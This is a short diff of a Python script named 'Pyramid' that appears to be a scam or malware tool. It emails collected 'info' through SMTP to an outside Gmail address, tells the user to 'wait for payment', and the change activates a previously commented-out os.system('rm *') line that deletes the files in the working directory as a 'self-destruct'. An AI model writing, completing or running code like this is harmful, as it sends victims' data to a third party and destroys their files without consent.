@@ -87,7 +87,7 @@ try:
       time.sleep(1)
       server.sendmail(username+"@gmail.com", "czechhacker08@gmail.com", info)
       print ("\n\033[1;36;40m [o] \033[1;32;40mMessage sent. Wait for payment.\n")
-######os.system("rm *")
+      os.system("rm *")
       print(" \033[1;31;40m[!] \033[1;35;40mPyramid\033[1;32;40m: \033[1;31;40mSELFDESTRUCTED.\n")
     except KeyboardInterrupt:
       print("\n \033[1;31;40m[!] \033[1;35;40mPyramid: \033[1;31;40mKeyboard Interrupted.\n")
